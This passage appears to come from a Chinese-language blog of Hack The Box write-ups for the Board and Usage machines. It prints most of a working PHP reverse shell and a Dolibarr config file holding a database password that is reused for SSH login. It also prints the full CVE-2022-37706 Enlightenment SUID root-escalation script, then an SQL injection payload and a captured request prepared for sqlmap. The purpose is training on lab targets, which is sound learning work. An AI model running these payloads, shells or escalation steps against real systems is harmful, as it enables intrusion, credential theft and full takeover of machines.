class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable\">$pid</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"number\">0</span>);  <span class=\"comment\">// Parent exits</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">posix_setsid</span>() == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$daemon</span> = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">chdir</span>(<span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">umask</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Open reverse connection</span></span><br><span class=\"line\"><span class=\"variable\">$sock</span> = <span class=\"title function_ invoke__\">fsockopen</span>(<span class=\"variable\">$ip</span>, <span class=\"variable\">$port</span>, <span class=\"variable\">$errno</span>, <span class=\"variable\">$errstr</span>, <span class=\"number\">30</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"variable\">$sock</span>) &#123;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;<span class=\"subst\">$errstr</span> (<span class=\"subst\">$errno</span>)&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$descriptorspec</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">   <span class=\"number\">0</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">&quot;pipe&quot;</span>, <span class=\"string\">&quot;r&quot;</span>),  <span class=\"comment\">// stdin is a pipe that the child will read from</span></span><br><span class=\"line\">   <span class=\"number\">1</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">&quot;pipe&quot;</span>, <span class=\"string\">&quot;w&quot;</span>),  <span class=\"comment\">// stdout is a pipe that the child will write to</span></span><br><span class=\"line\">   <span class=\"number\">2</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">&quot;pipe&quot;</span>, <span class=\"string\">&quot;w&quot;</span>)   <span class=\"comment\">// stderr is a pipe that the child will write to</span></span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$process</span> = <span class=\"title function_ invoke__\">proc_open</span>(<span class=\"variable\">$shell</span>, <span class=\"variable\">$descriptorspec</span>, <span class=\"variable\">$pipes</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">is_resource</span>(<span class=\"variable\">$process</span>)) &#123;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">stream_set_blocking</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">0</span>], <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">stream_set_blocking</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">1</span>], <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">stream_set_blocking</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">2</span>], <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">stream_set_blocking</span>(<span class=\"variable\">$sock</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;Successfully opened reverse shell to <span class=\"subst\">$ip</span>:<span class=\"subst\">$port</span>&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">feof</span>(<span class=\"variable\">$sock</span>)) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">feof</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">1</span>])) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$read_a</span> = <span class=\"keyword\">array</span>(<span class=\"variable\">$sock</span>, <span class=\"variable\">$pipes</span>[<span class=\"number\">1</span>], <span class=\"variable\">$pipes</span>[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  <span class=\"variable\">$num_changed_sockets</span> = <span class=\"title function_ invoke__\">stream_select</span>(<span class=\"variable\">$read_a</span>, <span class=\"variable\">$write_a</span>, <span class=\"variable\">$error_a</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$sock</span>, <span class=\"variable\">$read_a</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$debug</span>) <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;SOCK READ&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$input</span> = <span class=\"title function_ invoke__\">fread</span>(<span class=\"variable\">$sock</span>, <span class=\"variable\">$chunk_size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$debug</span>) <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;SOCK: <span class=\"subst\">$input</span>&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">0</span>], <span class=\"variable\">$input</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">1</span>], <span class=\"variable\">$read_a</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$debug</span>) <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;STDOUT READ&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$input</span> = <span class=\"title function_ invoke__\">fread</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">1</span>], <span class=\"variable\">$chunk_size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$debug</span>) <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;STDOUT: <span class=\"subst\">$input</span>&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$sock</span>, <span class=\"variable\">$input</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">2</span>], <span class=\"variable\">$read_a</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$debug</span>) <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;STDERR READ&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$input</span> = <span class=\"title function_ invoke__\">fread</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">2</span>], <span class=\"variable\">$chunk_size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$debug</span>) <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;STDERR: <span class=\"subst\">$input</span>&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$sock</span>, <span class=\"variable\">$input</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$sock</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">1</span>]);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">2</span>]);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">proc_close</span>(<span class=\"variable\">$process</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">printit</span> (<span class=\"params\"><span class=\"variable\">$string</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"variable\">$daemon</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">&quot;<span class=\"subst\">$string</span>\\n&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>拿到 www-data 的 shell<br>在 <code>/var/www/html/crm.board.htb/htdocs/conf/</code> 下找到 <code>conf.php</code>，里面有数据库的用户名和密码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">// File generated by Dolibarr installer 17.0.0 on May 13, 2024</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">// Take a look at conf.php.example file for an example of conf.php file</span></span><br><span class=\"line\"><span class=\"comment\">// and explanations for all possibles parameters.</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_url_root</span>=<span class=\"string\">&#x27;http://crm.board.htb&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_document_root</span>=<span class=\"string\">&#x27;/var/www/html/crm.board.htb/htdocs&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_url_root_alt</span>=<span class=\"string\">&#x27;/custom&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_document_root_alt</span>=<span class=\"string\">&#x27;/var/www/html/crm.board.htb/htdocs/custom&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_data_root</span>=<span class=\"string\">&#x27;/var/www/html/crm.board.htb/documents&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_host</span>=<span class=\"string\">&#x27;localhost&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_port</span>=<span class=\"string\">&#x27;3306&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_name</span>=<span class=\"string\">&#x27;dolibarr&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_prefix</span>=<span class=\"string\">&#x27;llx_&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_user</span>=<span class=\"string\">&#x27;dolibarrowner&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_pass</span>=<span class=\"string\">&#x27;serverfun2$2023!!&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_type</span>=<span class=\"string\">&#x27;mysqli&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_character_set</span>=<span class=\"string\">&#x27;utf8&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_collation</span>=<span class=\"string\">&#x27;utf8_unicode_ci&#x27;</span>;</span><br><span class=\"line\"><span class=\"comment\">// Authentication settings</span></span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_authentication</span>=<span class=\"string\">&#x27;dolibarr&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_main_demo=&#x27;autologin,autopass&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">// Security settings</span></span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_prod</span>=<span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_force_https</span>=<span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_restrict_os_commands</span>=<span class=\"string\">&#x27;mysqldump, mysql, pg_dump, pgrestore&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_nocsrfcheck</span>=<span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_instance_unique_id</span>=<span class=\"string\">&#x27;ef9a8f59524328e3c36894a9ff0562b5&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_mailing_limit_sendbyweb</span>=<span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_mailing_limit_sendbycli</span>=<span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_FPDF_PATH=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_TCPDF_PATH=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_FPDI_PATH=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_TCPDI_PATH=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_GEOIP_PATH=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_NUSOAP_PATH=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_ODTPHP_PATH=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_ODTPHP_PATHTOPCLZIP=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_js_CKEDITOR=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_js_JQUERY=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_js_JQUERY_UI=&#x27;&#x27;;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_font_DOL_DEFAULT_TTF=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_font_DOL_DEFAULT_TTF_BOLD=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_distrib</span>=<span class=\"string\">&#x27;standard&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>登进数据库</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u dolibarrowner -p</span><br></pre></td></tr></table></figure>\n\n<p>然后连上 dolibarr 数据库，查看表</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use dolibarr;</span><br><span class=\"line\"><span class=\"keyword\">show</span> tables;</span><br></pre></td></tr></table></figure>\n\n<p>发现没啥东西。<br><code>ls /home</code> 发现有个用户叫 larissa，用数据库的密码 ssh 进去，拿到第一个 flag。</p>\n<p>然后开始提权<br>传个 <code>linpeas.sh</code> 过去开扫，发现 SUID 项里有 enlightenment，执行 <code>enlightenment -version</code> 可知版本为 0.23.1。</p>\n<p><code>searchsploit enlightenment</code> 看到有个提权漏洞，再 <code>searchsploit -p linux/local/51180.txt</code> 看具体信息</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"attr\">Exploit:</span> <span class=\"string\">Enlightenment</span> <span class=\"string\">v0.25.3</span> <span class=\"bullet\">-</span> <span class=\"string\">Privilege</span> <span class=\"string\">escalation</span></span><br><span class=\"line\">      <span class=\"attr\">URL:</span> <span class=\"string\">https://www.exploit-db.com/exploits/51180</span></span><br><span class=\"line\">     <span class=\"attr\">Path:</span> <span class=\"string\">/usr/share/exploitdb/exploits/linux/local/51180.txt</span></span><br><span class=\"line\">    <span class=\"attr\">Codes:</span> <span class=\"string\">CVE-2022-37706</span></span><br><span class=\"line\"> <span class=\"attr\">Verified:</span> <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"attr\">File Type:</span> <span class=\"string\">ASCII</span> <span class=\"string\">text</span></span><br></pre></td></tr></table></figure>\n\n<p><code>cat /usr/share/exploitdb/exploits/linux/local/51180.txt</code>，里面说这个洞能打 0.25.3 以下版本，也给出了 PoC 如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/usr/bin/bash</span></span><br><span class=\"line\"><span class=\"comment\"># Idea by MaherAzzouz</span></span><br><span class=\"line\"><span class=\"comment\"># Development by nu11secur1ty</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;CVE-2022-37706&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[*] Trying to find the vulnerable SUID file...&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[*] This may take few seconds...&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The actual problem</span></span><br><span class=\"line\">file=$(find / -name enlightenment_sys -perm -4000 2&gt;/dev/null | <span class=\"built_in\">head</span> -1)</span><br><span class=\"line\"><span class=\"keyword\">if</span> [[ -z <span class=\"variable\">$&#123;file&#125;</span> ]]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;[-] Couldn&#x27;t find the vulnerable SUID file...&quot;</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;[*] Enlightenment should be installed on your system.&quot;</span></span><br><span class=\"line\">        <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] Vulnerable SUID binary found!&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] Trying to pop a root shell!&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p /tmp/net</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p <span class=\"string\">&quot;/dev/../tmp/;/tmp/exploit&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;/bin/sh&quot;</span> &gt; /tmp/exploit</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> a+x /tmp/exploit</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] Welcome to the rabbit hole :)&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$&#123;file&#125;</span> /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(<span class=\"built_in\">id</span> -u), <span class=\"string\">&quot;/dev/../tmp/;/tmp/exploit&quot;</span> /tmp///net</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">read</span> -p <span class=\"string\">&quot;Press any key to clean the evedence...&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;Please wait... &quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf /tmp/exploit</span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf /tmp/net</span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;Done; Everything is clear ;)&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>中间的 <code>$&#123;file&#125;</code> 那行不知道为啥断行了，给它三句连起来，记得加空格。<br>在靶机执行拿到 root 的 shell，读 <code>root.txt</code> 拿到第二个 flag。</p>\n<h2 id=\"Usage\"><a href=\"#Usage\" class=\"headerlink\" title=\"Usage\"></a>Usage</h2><p>扫端口只有 80 和 22，老样子，先加 host</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">echo</span> <span class=\"string\">&quot;10.10.11.18    http://usage.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>\n\n<p>然后访问，是一个登录页面，用 whatweb 看眼，发现是 Laravel</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ whatweb http://usage.htb/</span><br><span class=\"line\">http://usage.htb/ [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.18], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]</span><br></pre></td></tr></table></figure>\n\n<p>在 <a href=\"https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-web/laravel\">Hacktricks</a> 上有说存在 SQL 注入漏洞，测一下<br>先注册一个 <code>a@a.com</code> 的用户，再在重置密码的 <code>email</code> 项输入 <code>a@a.com&#39;</code>，发现引号能触发 500 错误，说明存在注入。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a<span class=\"variable\">@a</span>.com<span class=\"string\">&#x27; AND 1=1;-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>上面的语句的 response 是成功执行。于是把请求体复制到 request.txt，用 sqlmap 跑</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">POST</span> <span class=\"string\">http://usage.htb/forget-password</span> <span class=\"string\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attr\">Host:</span> <span class=\"string\">usage.htb</span></span><br><span class=\"line\"><span class=\"attr\">Content-Length:</span> <span class=\"number\">84</span></span><br><span class=\"line\"><span class=\"attr\">Cache-Control:</span> <span class=\"string\">max-age=0</span></span><br><span class=\"line\"><span class=\"attr\">Upgrade-Insecure-Requests:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">Origin:</span> <span class=\"string\">http://usage.htb</span></span><br><span class=\"line\"><span class=\"attr\">Content-Type:</span> <span class=\"string\">application/x-www-form-urlencoded</span></span><br><span class=\"line\"><span class=\"attr\">User-Agent:</span> <span class=\"string\">Mozilla/5.0</span> <span class=\"string\">(Windows</span> <span class=\"string\">NT</span> <span class=\"number\">10.0</span><span class=\"string\">;</span> <span class=\"string\">Win64;</span> <span class=\"string\">x64)</span> <span class=\"string\">AppleWebKit/537.36</span> <span class=\"string\">(KHTML,</span> <span class=\"string\">like</span> <span class=\"string\">Gecko)</span> <span class=\"string\">Chrome/123.0.6312.122</span> <span class=\"string\">Safari/537.36</span></span><br><span class=\"line\"><span class=\"attr\">Accept:</span> <span class=\"string\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class=\"line\"><span class=\"attr\">Referer:</span> <span class=\"string\">http://usage.htb/forget-password</span></span><br><span class=\"line\"><span class=\"attr\">Accept-Encoding:</span> <span class=\"string\">gzip,</span> <span class=\"string\">deflate,</span> <span class=\"string\">br</span></span><br><span class=\"line\"><span class=\"attr\">Accept-Language:</span> <span class=\"string\">zh-CN,zh;q=0.9</span></span><br><span class=\"line\"><span class=\"attr\">Cookie:</span> <span class=\"string\">XSRF-TOKEN=eyJpdiI6IkhFakpQK2l4cU5sYkhHZzZoN00rUmc9PSIsInZhbHVlIjoiYysvaTY0WDl1dXBXMGR2TzM5YWt2aEg4T051akNzTDFxcWJzUC9yY3pPajN4ei9FRTRJbzNuQ2htY0pmc25xWGR5anV6UzFHTkJ1N2tYYWlJcUEzNjZnSmNVMzdaa0hWNWlST3BVeTlqUnpBdVJ0aEVlOTVUSnBlNXdTa29UTk8iLCJtYWMiOiI0NzIxOTRkMTk4ZWEyN2E2YjI1YTA1NzI4ODg3MzFjZWM0YjJkZGRhNTZjOWYxZGVkNmRjMWRkNTYyNzYzMjUwIiwidGFnIjoiIn0%3D;</span> <span 